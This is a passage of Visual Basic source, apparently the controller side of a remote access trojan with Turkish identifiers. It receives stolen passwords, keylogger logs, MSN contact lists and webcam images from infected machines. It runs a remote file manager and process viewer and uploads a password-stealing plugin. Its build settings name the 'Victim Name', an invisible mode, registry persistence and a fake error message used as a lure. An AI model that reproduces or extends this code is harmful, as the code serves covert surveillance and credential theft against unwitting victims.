             oItem.SubItems(1) = sDParam(1)
             oItem.SubItems(2) = GetString(2, sDParam(2))
             oItem.SubItems(3) = GetString(3, sDParam(3))
             oItem.SubItems(4) = sDParam(4)
            Next
            hk 575
            
        Case "[SETMODLT]"
            lvw(5).ListItems.Clear
            For i = 1 To UBound(sMParam) - 1
             sDParam = Split(sMParam(i), Chr(0))
             Set oItem = lvw(5).ListItems.Add(, , sDParam(0), , 16)
             oItem.SubItems(1) = sDParam(1)
             oItem.SubItems(2) = "0x" & Hex(sDParam(2))
            Next
            hk 576

        Case "[SETWNDLT]"
            lvw(6).ListItems.Clear
            frmsanalklavye.pencere.ListItems.Clear
            For i = 0 To UBound(sMParam) - 1
             sDParam = Split(sMParam(i), Chr(0))
             Set oItem = lvw(6).ListItems.Add(, , sDParam(0), , IIf(bWHidden, 6, 6))
             oItem.SubItems(1) = sDParam(1)
             oItem.SubItems(2) = GetString(1, sDParam(2))
             oItem.SubItems(3) = sDParam(3)
             oItem.SubItems(3) = sDParam(3)
             oItem.SubItems(4) = sDParam(4)
             Set oItem = frmsanalklavye.pencere.ListItems.Add(, , sDParam(0))
             oItem.SubItems(1) = sDParam(1)
            Next
            hk 577
            
        Case "[SETDRIVE]"
            Load frmfilemanager
            frmfilemanager.Show
            For i = 0 To UBound(sMParam) - 1
            sDParam = Split(sMParam(i), Chr(0))
            Set eleman = frmfilemanager.lvwdrivers.ListItems.Add(, , sDParam(0) & " - " & GetString(4, sDParam(1)), sayac, sayac)
            Next
            hk 467
        Case "[SETFILES]"
            Load frmfilemanager
            frmfilemanager.Show
            For i = 0 To UBound(sMParam) - 1
             lFilesCount = lFilesCount + 1
             sDParam = Split(sMParam(i), Chr(0))
             If Left(sDParam(0), 1) = "<" Then
                sDParam(0) = Right(sDParam(0), Len(sDParam(0)) - 1)
                Set oItem = frmfilemanager.lstFiles.ListItems.Add(, , sDParam(0), 11, 11)
                oItem.SubItems(1) = "File Folder"
                oItem.SubItems(2) = vbNullString
                oItem.SubItems(3) = GetFileAttr(sDParam(1))
             Else
                Set oItem = frmfilemanager.lstFiles.ListItems.Add(, , sDParam(0), simgebul(sDParam(0)), simgebul(sDParam(0)))
                oItem.SubItems(1) = GetFileExtention(sDParam(0))
                oItem.SubItems(2) = FormatKB(sDParam(1))
                oItem.SubItems(3) = GetFileAttr(sDParam(2))
                lFilesSize = lFilesSize + sDParam(1)
             End If
            Next
            hk 566
            wskServer(Index).SendData "[GETFILER]"
        Case "[SETFILER]"
            Load frmfilemanager
            frmfilemanager.Tag = "S:" & Index
            frmfilemanager.Show
            For i = 0 To UBound(sMParam) - 1
             lFilesCount = lFilesCount + 1
             sDParam = Split(sMParam(i), Chr(0))
             If Left(sDParam(0), 1) = "<" Then
                sDParam(0) = Right(sDParam(0), Len(sDParam(0)) - 1)
                Set oItem = frmfilemanager.lstFiles.ListItems.Add(, , sDParam(0), 11, 11)
                oItem.SubItems(1) = "File Folder"
                oItem.SubItems(2) = vbNullString
                oItem.SubItems(3) = GetFileAttr(sDParam(1))
             Else
                Set oItem = frmfilemanager.lstFiles.ListItems.Add(, , sDParam(0), simgebul(sDParam(0)), simgebul(sDParam(0)))
                oItem.SubItems(1) = GetFileExtention(sDParam(0))
                oItem.SubItems(2) = FormatKB(sDParam(1))
                oItem.SubItems(3) = GetFileAttr(sDParam(2))
                lFilesSize = lFilesSize + sDParam(1)
             End If
            Next
            lFilesSize = 0
            lFilesCount = 0
            hk 566
        
        Case "[SETPRCKL]"
            If sMParam(0) = 0 Then serverhaberindis = 596
            If sMParam(0) = 1 Then serverhaberindis = 597
            hk serverhaberindis
        Case "[SETPRCPR]"
            If sMParam(0) = 0 Then serverhaberindis = 596
            If sMParam(0) = 1 Then serverhaberindis = 597
            hk serverhaberindis
        Case "[SETMODKL]"
            If sMParam(0) = 0 Then serverhaberindis = 596
            If sMParam(0) = 1 Then serverhaberindis = 597
            hk serverhaberindis
        Case "[SETSRVST]"
            If sMParam(0) = 0 Then serverhaberindis = 596
            If sMParam(0) = 1 Then serverhaberindis = 597
            hk serverhaberindis
        Case "[SETKILFL]"
            hk Val(sMParam(0))
        Case "[SETRENFL]"
            hk Val(sMParam(0))
            
        Case "[KILFOLDR]"
            Select Case sMParam(0)
                Case "0": hk 468
                Case "-1": hk 469
                Case Else: hk 470
            End Select
            
        
        Case "[SHORTYOL]" 'kýsayol dizinlere göz at
            frmfilemanager.BrowseFolder sMParam(0)
            hk 474
        Case "[SENDFILE]"
        bar.Value = 0
        Select Case sMParam(0)
            Case "1"
                bar.Max = Val(sMParam(1))
            Case "2"
                bar.Max = Val(sMParam(1))
            Case "3"
                bar.Max = Val(sMParam(1))
        End Select
        
        Case "[SRVERBIL]"
            lvw(1).ListItems.Clear
            lvw(1).ListItems.Add , , "General Settings", 1, 1
            lvw(1).ListItems.Add , "jink1", "        Victim Name"
            lvw(1).ListItems.Add , "jink2", "        IP Adress"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems.Add , , "Connection Settings", 4, 4
            lvw(1).ListItems.Add , "jink3", "        Delay"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems.Add , , "Port Settings", 20, 20
            lvw(1).ListItems.Add , "jink4", "        Connection"
            lvw(1).ListItems.Add , "jink5", "        Transfer"
            lvw(1).ListItems.Add , "jink6", "        Screen"
            lvw(1).ListItems.Add , "jink7", "        WebCam"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems.Add , , "Server Mode", 6, 6
            lvw(1).ListItems.Add , "jink8", "        Visible"
            lvw(1).ListItems.Add , "jink9", "        Invisible"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems.Add , , "Registry Settings", 32, 32
            lvw(1).ListItems.Add , , "        Key"
            lvw(1).ListItems.Add , , "        Value"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems.Add , , "Server Path", 8, 8
            lvw(1).ListItems.Add , , "        Windows"
            lvw(1).ListItems.Add , , "        System"
            lvw(1).ListItems.Add , , "        System32"
            lvw(1).ListItems.Add , , ""

            lvw(1).ListItems.Add , , "Fake Error Message", 28, 28
            lvw(1).ListItems.Add , , "        Show"
            lvw(1).ListItems.Add , , "        Message"
            lvw(1).ListItems.Add , , "        Message Title"
            lvw(1).ListItems.Add , , "        Message Icon"
            lvw(1).ListItems.Add , , ""
            
            lvw(1).ListItems(2).SubItems(1) = sMParam(1)
            lvw(1).ListItems(3).SubItems(1) = sMParam(0)
            lvw(1).ListItems(6).SubItems(1) = sMParam(2)
            
            lvw(1).ListItems(9).SubItems(1) = sMParam(9) '3,4,5
            lvw(1).ListItems(10).SubItems(1) = sMParam(10)
            lvw(1).ListItems(11).SubItems(1) = sMParam(11)
            lvw(1).ListItems(12).SubItems(1) = sMParam(12)
            
            If sMParam(14) = "0" Then
                lvw(1).ListItems(15).SubItems(1) = "0"
                lvw(1).ListItems(16).SubItems(1) = "1"
            Else
                lvw(1).ListItems(15).SubItems(1) = "1"
                lvw(1).ListItems(16).SubItems(1) = "0"
            End If
            
            lvw(1).ListItems(19).SubItems(1) = sMParam(3)
            lvw(1).ListItems(20).SubItems(1) = sMParam(4)
            
            
            Select Case sMParam(13)
                Case "0"
                    lvw(1).ListItems(23).SubItems(1) = "1"
                    lvw(1).ListItems(24).SubItems(1) = "0"
                    lvw(1).ListItems(25).SubItems(1) = "0"
                Case "1"
                    lvw(1).ListItems(23).SubItems(1) = "0"
                    lvw(1).ListItems(24).SubItems(1) = "1"
                    lvw(1).ListItems(25).SubItems(1) = "0"
                Case "2"
                    lvw(1).ListItems(23).SubItems(1) = "0"
                    lvw(1).ListItems(24).SubItems(1) = "0"
                    lvw(1).ListItems(25).SubItems(1) = "1"
            End Select

            
            lvw(1).ListItems(28).SubItems(1) = sMParam(5)
            lvw(1).ListItems(29).SubItems(1) = sMParam(6)
            lvw(1).ListItems(30).SubItems(1) = sMParam(7)
            lvw(1).ListItems(31).SubItems(1) = sMParam(8)
            
            hk 471
            
        Case "[SERCLOSE]"
            hk 590
            wskServer(Index).Close
            Unload wskServer(Index)
            lvw(0).ListItems.Remove "S:" & Index
            
        Case "[OFLINLOG]"
            txtoffline.Text = sMParam(0)
            hk 472
            txtoffline.SelStart = Len(txtoffline.Text)
        Case "[PASSWORD]"
        If Len(sMParam(0)) <> 0 Or sMParam(0) <> "" Then
            txtsifreler(0).Text = txtsifreler(0).Text & sMParam(0)
            txtsifreler(0).SelStart = Len(txtsifreler(0).Text)
        End If
            hk 475
        Case "[CAMEINFO]"
            If sMParam(0) = "0" Then
                hk 476
            Else
                hk 477
            End If
            
        Case "[STEXPLRR]"
            Select Case sMParam(0)
                Case "0"
                     hk 478
                Case "1"
                    txtinternetexplorer(1).Text = sMParam(1)
                     hk 479
                Case "2"
                    txtinternetexplorer(2).Text = sMParam(1)
                    hk 480
            End Select
        
        Case "[ONLINLOG]"
            txtonline.Text = txtonline.Text & Replace(sMParam(0), "[ONLINLOG]", "", , , vbTextCompare)
            txtonline.SelStart = Len(txtonline.Text)
            hk 481
            
        Case "[SWRHABER]"
             hk Val(sMParam(0))
            
        Case "[TEXTREAD]"
            If Len(sMParam(0)) > 1 Then
            frmfilemanager.txttextoku.Text = sMParam(0)
            frmfilemanager.Height = 10245
            End If
            hk 482
            
        Case "[MSNCLIST]"
            lvw(8).ListItems.Clear
            Dim onofsimge As Integer
            On Local Error Resume Next
            If Val(sMParam(0)) > 0 Then
            For sayac = 1 To Val(sMParam(0)) Step 3
                    Select Case sMParam(sayac + 2)
                        Case "0"
                            onofsimge = 44
                        Case "1"
                            onofsimge = 43
                        Case "2", "34"
                            onofsimge = 42 'disarda
                        Case "3", "10", "50"
                            onofsimge = 41 'mesgul
                        Case Else
                            onofsimge = 42 'disarda
                    End Select
                    lvw(8).ListItems.Add , , sMParam(sayac), onofsimge, onofsimge
                    lvw(8).ListItems.Item(lvw(8).ListItems.Count).SubItems(1) = sMParam(sayac + 1)
            Next
            End If
            hk 483
        Case "[MSNONLIN]"
            lvw(9).ListItems.Clear
            kimeedicen.Clear
            For sayac = 1 To Val(sMParam(0))
                    lvw(9).ListItems.Add , , sMParam(sayac), 44, 44
                    kimeedicen.AddItem sMParam(sayac)
            Next
            hk 484
        
        Case "[MSNAYARI]"
            Select Case sMParam(0)
                Case "0"
                msngrileti(2).Text = sMParam(1)
                hk 485
            End Select
            
            
        Case "[FILESIZE]"
            bar.Value = 0
            If Val(sMParam(0)) <> 0 Then
            bar.Max = Val(sMParam(0))
            hk 486
            End If
            
        Case "[WEBCAMAL]"
            lbl(1).Caption = sMParam(0)
            
        Case "[UPLDTAMM]"
            lvwtransfer.ListItems.Remove transferindex
            hk 564
            bar.Value = bar.Max
            wsktransfer.Close
        
        
        
        Case "[PLUGINST]"
                lvwtransfer.ListItems.Clear
                lvwtransfer.ListItems.Add , , App.Path & "\Plugins\pssplugin.exe", , 49
                frmana.lvwtransfer.ListItems(1).SubItems(1) = "pssplugin.exe"
                frmana.lvwtransfer.ListItems(1).SubItems(2) = FormatKB(FileLen(App.Path & "\Plugins\pssplugin.exe"))
                frmana.lvwtransfer.ListItems(1).SubItems(3) = frmana.dil.List(560)
                frmana.lvwtransfer.ListItems(1).SubItems(4) = "U"
                transferindex = 1
                transferislem = "U"
                kayityeri = lvwtransfer.ListItems(1).Text
            

    End Select


End If
End Sub

Private Sub wskServer_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
wskServer(Index).Close
lvw(0).ListItems.Remove "S:" & Index

End Sub

Public Function transferayari(nereden As String, nereye As String, islem As String)
lvwtransfer.ListItems.Add , , nereden
lvwtransfer.ListItems(lvwtransfer.ListItems.Count).SubItems(1) = nereye
lvwtransfer.ListItems(lvwtransfer.ListItems.Count).SubItems(2) = FileLen(nereden)
lvwtransfer.ListItems(lvwtransfer.ListItems.Count).SubItems(3) = "customstring(2)"
lvwtransfer.ListItems(lvwtransfer.ListItems.Count).SubItems(4) = islem
End Function

Private Sub wsktransfer_ConnectionRequest(ByVal requestID As Long)
If wsktransfer.State <> sckClosed Then wsktransfer.Close
wsktransfer.Accept requestID
lvw(7).ListItems(2).SmallIcon = 33
bar.Value = 0
Select Case LCase(transferislem)
    Case "u"
        lvwtransfer.ListItems(transferindex).SubItems(3) = dil.List(563)
        Open kayityeri For Binary Access Read As #1
            Dim SendBuffer As String
            SendBuffer = Space$(LOF(1))
            Get #1, , SendBuffer
        Close #1
        bar.Max = FileLen(kayityeri)
    wsktransfer.SendData SendBuffer & "/\/\ENDOFFILE/\/\"
    e = 2
    r = Timer
    Do Until Timer > r + 2
    DoEvents
    Loop
    Exit Sub

    Case "d"
    bilgigonder "[DTPORTAC]2"
    lvwtransfer.ListItems(transferindex).SubItems(3) = dil.List(561)
            
End Select
'Dim transferindex As Integer
'kayityeri

 
End Sub

Private Sub wsktransfer_Close()
wsktransfer.Close
lvw(7).ListItems(2).SmallIcon = 34
End Sub

Private Sub wsktransfer_DataArrival(ByVal bytesTotal As Long)
Dim gelen As String
Dim Gecici As String
Dim toplamtransfer As String
wsktransfer.GetData gelen, vbString
toplamtransfer = toplamtransfer & gelen
bar.Value = Len(toplamtransfer)
If kayityeri <> "" Then
If DosyaACIKMI = False Then
    Open kayityeri For Binary Access Write As #3
        DosyaACIKMI = True
    ElseIf DosyaACIKMI = True Then
End If
If Right(gelen, 17) = "/\/\ENDOFFILE/\/\" Then
    Gecici = Mid(gelen, 1, Len(gelen) - 17)
    Put #3, , Gecici
    Close #3
    DosyaACIKMI = False
    lvwtransfer.ListItems.Remove transferindex
    wsktransfer.Close
    toplamtransfer = ""
    bar.Value = bar.Max
    hk 562
    Exit Sub
Else
Put #3, , gelen
End If
End If
End Sub

Private Sub wsktransfer_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wsktransfer.Close
lvw(7).ListItems(2).SmallIcon = 34
End Sub

Private Sub wskwebcam_Close()
wskwebcam.Close
lvw(7).ListItems(4).SmallIcon = 34
End Sub
Private Sub wskwebcam_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskwebcam.Close
lvw(7).ListItems(4).SmallIcon = 34
End Sub
Private Sub wskwebcam_ConnectionRequest(ByVal requestID As Long)
If wskwebcam.State <> sckClosed Then wskwebcam.Close
 wskwebcam.Accept requestID
 bilgigonder "[WEBCAMAL]"
 lvw(7).ListItems(4).SmallIcon = 33
End Sub

Private Sub wskwebcam_DataArrival(ByVal bytesTotal As Long)
Dim gelen As String
Dim Gecici As String
wskwebcam.GetData gelen, vbString
If bar.Max < bytesTotal Then bar.Max = bytesTotal
bar.Value = bytesTotal

If wDosyaACIKMI = False Then
    Open App.Path & "\webcam.jpg" For Binary Access Write As #3
        wDosyaACIKMI = True
    ElseIf wDosyaACIKMI = True Then
End If
If Right(gelen, 17) = "/\/\ENDOFFILE/\/\" Then
    Gecici = Mid(gelen, 1, Len(gelen) - 17)
    Put #3, , Gecici
    Close #3
    If Dir(App.Path & "\webcam.jpg") <> "" And FileLen(App.Path & "\webcam.jpg") > 0 Then
        webcamgoruntu.Picture = LoadPicture(App.Path & "\webcam.jpg")
    End If
    wDosyaACIKMI = False
    bar.Value = bar.Max
    Exit Sub
Else
Put #3, , gelen
End If
End Sub

Private Sub yuklemedizini_Click(Index As Integer)
nereyeinceksin = Index
End Sub
